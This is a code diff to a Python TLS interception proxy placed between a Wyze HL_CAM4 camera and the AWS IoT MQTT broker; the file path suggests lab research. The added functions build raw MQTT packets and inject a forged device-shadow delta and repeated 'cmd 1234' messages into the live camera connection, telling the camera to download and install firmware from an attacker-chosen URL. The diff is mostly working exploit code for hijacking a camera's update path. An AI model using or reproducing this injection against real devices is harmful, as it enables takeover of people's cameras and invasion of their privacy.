@@ -1,4 +1,4 @@
-import socket, ssl, os, threading, time
+import socket, ssl, os, threading, time, json, struct
 THING=os.environ.get("THING","80482c4bcf0b"); D=os.path.expanduser(os.environ.get("D","~/.config/fss-lab/wyze_iot/80482C4BCF0B"))
 UP=("aws-iot.wyzecam.com",8883); SNI="a24rq1e5m4mtei.iot.us-west-2.amazonaws.com"
 def up_ctx():
@@ -39,12 +39,62 @@ def log(direction,d):
         except Exception: print(direction,"PUBLISH <unparsed>",flush=True)
     elif t in (8,): print(direction,"SUBSCRIBE",flush=True)
     elif t in (1,): print(direction,"CONNECT",flush=True)
+URL=os.environ.get("OTA_URL","https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.33.tar")
+MD5=os.environ.get("OTA_MD5","")
+def _enc(n):
+    o=b""
+    while True:
+        d=n%128; n//=128; o+=bytes([d|(0x80 if n else 0)])
+        if not n: return o
+def _pkt(kind, body, flags=0):
+    return bytes([(kind<<4)|flags])+_enc(len(body))+body
+def _pub(sock, topic, payload, qos0=True):
+    tb=topic.encode(); body=struct.pack(">H",len(tb))+tb+payload
+    sock.sendall(_pkt(3, body, 0x00 if qos0 else 0x02))
+def inject(cli):
+    time.sleep(6)
+    if not MD5:
+        print("inject: OTA_MD5 unset",flush=True); return
+    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":"HL_CAM4","sub_mac":THING.upper()},"reported":{}},"version":999}
+    try:
+        _pub(cli, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
+        print("inject: delta",flush=True)
+    except Exception as e: print("inject delta fail",repr(e),flush=True); return
+    time.sleep(10)
+    for i in range(20):
+        pl=json.dumps({"cmd":1234,"sub_mac":THING.upper(),"url":URL,"md5":MD5,"model":"HL_CAM4"}).encode()
+        try:
+            _pub(cli, f"hl/devices/{THING}/cmd", pl, qos0=False)
+            print("inject: cmd 1234",flush=True)
+        except Exception as e: print("inject cmd fail",repr(e),flush=True); return
+        time.sleep(4)
+
+LIVE={"c":None}
+def injector():
+    """Push the delta into whichever camera connection is live, retrying across reconnects."""
+    time.sleep(4)
+    if not MD5:
+        print("inject: OTA_MD5 unset",flush=True); return
+    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":"HL_CAM4","sub_mac":THING.upper()},"reported":{}},"version":999}
+    for _ in range(30):
+        c=LIVE.get("c")
+        if c:
+            try:
+                _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
+                print("inject: delta sent",flush=True); return
+            except Exception as e: print("inject retry",repr(e),flush=True)
+        time.sleep(3)
+    print("inject: gave up",flush=True)
+
 def handle(cli):
     try:
         u=up_ctx().wrap_socket(socket.create_connection(UP,timeout=10),server_hostname=SNI)
         print("UP ok",flush=True)
     except Exception as e: print("upstream fail",repr(e),flush=True); cli.close(); return
     threading.Thread(target=pipe,args=(cli,u,"C"),daemon=True).start()
+    LIVE["c"]=cli
+    if os.environ.get("INJECT"):
+        threading.Thread(target=inject,args=(cli,),daemon=True).start()
     pipe(u,cli,"S")
 def main():
     ctx=srv_ctx(); s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
